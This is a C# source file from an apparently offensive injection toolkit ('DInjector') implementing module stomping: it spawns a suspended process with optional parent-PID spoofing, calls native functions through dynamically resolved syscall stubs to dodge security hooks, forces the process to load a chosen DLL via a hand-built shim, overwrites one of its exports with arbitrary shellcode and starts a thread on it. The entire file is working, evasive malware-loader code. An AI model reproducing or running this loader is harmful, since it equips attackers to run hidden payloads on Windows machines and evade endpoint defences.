using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    /// <summary>
    /// Based on:
    /// https://offensivedefence.co.uk/posts/module-stomping/
    /// https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Stomper.cs
    /// </summary>
    public class ModuleStomping
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            DI.Data.Win32.WinNT.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtWaitForSingleObject(
            IntPtr ObjectHandle,
            bool Alertable, uint Timeout);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtFreeVirtualMemory(
            IntPtr processHandle,
            ref IntPtr baseAddress,
            ref IntPtr regionSize,
            uint freeType);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseHandle(IntPtr hObject);

        private static bool closeHandle(IntPtr hObject)
        {
            object[] parameters = { hObject };
            return (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
        }

        private static byte[] GenerateShim(long loadLibraryExP)
        {
            using var ms = new MemoryStream();
            using var bw = new BinaryWriter(ms);

            bw.Write((ulong)loadLibraryExP);
            var loadLibraryExBytes = ms.ToArray();

            return new byte[] {
                0x48, 0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3], loadLibraryExBytes[4], loadLibraryExBytes[5], loadLibraryExBytes[6],loadLibraryExBytes[7],
                0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
                0x48, 0x31, 0xD2,
                0xFF, 0xE0
            };
        }

        public static void Execute(byte[] shellcodeBytes, string processImage, string moduleName, string exportName, int ppid = 0, bool blockDlls = false)
        {
            var shellcode = shellcodeBytes;

            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                @"C:\Windows\System32",
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls);

            #endregion

            #region GenerateShim

            var kernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            var loadLibraryEx = DI.DynamicInvoke.Generic.GetExportAddress(kernel32, "LoadLibraryExA");

            var shim = GenerateShim((long)loadLibraryEx);
            var bModuleName = Encoding.ASCII.GetBytes(moduleName);

            #endregion

            #region NtAllocateVirtualMemory (bModuleName, PAGE_READWRITE)

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

            IntPtr hProcess = pi.hProcess;
            var allocModule = IntPtr.Zero;
            var regionSize = new IntPtr(bModuleName.Length + 2);
            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtAllocateVirtualMemory(
                hProcess,
                ref allocModule,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtAllocateVirtualMemory (bModuleName), PAGE_READWRITE");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtAllocateVirtualMemory (bModuleName), PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtAllocateVirtualMemory (shim, PAGE_READWRITE)

            var allocShim = IntPtr.Zero;
            regionSize = new IntPtr(shim.Length);

            ntstatus = sysNtAllocateVirtualMemory(
                hProcess,
                ref allocShim,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtAllocateVirtualMemory (shim), PAGE_READWRITE");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtAllocateVirtualMemory (shim), PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (bModuleName)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

            var buffer = Marshal.AllocHGlobal(bModuleName.Length);
            Marshal.Copy(bModuleName, 0, buffer, bModuleName.Length);

            uint bytesWritten = 0;

            ntstatus = sysNtWriteVirtualMemory(
                hProcess,
                allocModule,
                buffer,
                (uint)bModuleName.Length,
                ref bytesWritten);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtWriteVirtualMemory (bModuleName)");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtWriteVirtualMemory (bModuleName): {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtWriteVirtualMemory (shim)

            buffer = Marshal.AllocHGlobal(shim.Length);
            Marshal.Copy(shim, 0, buffer, shim.Length);

            ntstatus = sysNtWriteVirtualMemory(
                hProcess,
                allocShim,
                buffer,
                (uint)shim.Length,
                ref bytesWritten);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtWriteVirtualMemory (shim)");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtWriteVirtualMemory (shim): {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (shim, PAGE_EXECUTE_READ)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            IntPtr protectAddress = allocShim;
            regionSize = new IntPtr(shim.Length);

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtProtectVirtualMemory (shim), PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtProtectVirtualMemory (shim), PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (shim)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            NtCreateThreadEx sysNtCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

            IntPtr hThread = IntPtr.Zero;

            ntstatus = sysNtCreateThreadEx(
                out hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                allocShim,
                allocModule,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtCreateThreadEx (shim)");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtCreateThreadEx (shim): {ntstatus}");

            #endregion

            #region NtWaitForSingleObject

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWaitForSingleObject");
            NtWaitForSingleObject sysNtWaitForSingleObject = (NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWaitForSingleObject));

            ntstatus = sysNtWaitForSingleObject(
                hThread,
                false,
                0);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtWaitForSingleObject");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtWaitForSingleObject: {ntstatus}");

            #endregion

            #region NtFreeVirtualMemory (allocModule)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtFreeVirtualMemory");
            NtFreeVirtualMemory sysNtFreeVirtualMemory = (NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtFreeVirtualMemory));

            regionSize = IntPtr.Zero;

            ntstatus = sysNtFreeVirtualMemory(
                hProcess,
                ref allocModule,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtFreeVirtualMemory (allocModule)");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtFreeVirtualMemory (allocModule): {ntstatus}");

            #endregion

            #region NtFreeVirtualMemory (allocShim)

            regionSize = IntPtr.Zero;

            ntstatus = sysNtFreeVirtualMemory(
                hProcess,
                ref allocShim,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_RELEASE);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtFreeVirtualMemory (allocShim)");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtFreeVirtualMemory (allocShim): {ntstatus}");

            #endregion

            closeHandle(hThread);

            #region Find targetAddress

            var hModule = DI.DynamicInvoke.Generic.LoadModuleFromDisk(moduleName);
            var export = DI.DynamicInvoke.Generic.GetExportAddress(hModule, exportName);
            var offset = (long)export - (long)hModule;

            var targetAddress = IntPtr.Zero;
            using var process = Process.GetProcessById((int)pi.dwProcessId);

            foreach (ProcessModule module in process.Modules)
            {
                if (!module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase)) continue;

                targetAddress = new IntPtr((long)module.BaseAddress + offset);
                break;
            }

            #endregion

            #region NtProtectVirtualMemory (shellcode, PAGE_READWRITE)

            protectAddress = targetAddress;
            regionSize = new IntPtr(shellcode.Length);

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_READWRITE,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtProtectVirtualMemory (shellcode), PAGE_READWRITE");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtProtectVirtualMemory (shellcode), PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            ntstatus = sysNtWriteVirtualMemory(
                hProcess,
                targetAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtWriteVirtualMemory (shellcode)");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtWriteVirtualMemory (shellcode): {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (shellcode, PAGE_EXECUTE_READ)

            protectAddress = targetAddress;

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtProtectVirtualMemory (shellcode), PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtProtectVirtualMemory (shellcode), PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtCreateThreadEx (shellcode)

            hThread = IntPtr.Zero;

            ntstatus = sysNtCreateThreadEx(
                out hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                targetAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == 0)
                Console.WriteLine("(ModuleStomping) [+] NtCreateThreadEx (shellcode)");
            else
                Console.WriteLine($"(ModuleStomping) [-] NtCreateThreadEx (shellcode): {ntstatus}");

            #endregion

            closeHandle(hThread);
            closeHandle(hProcess);
        }
    }
}
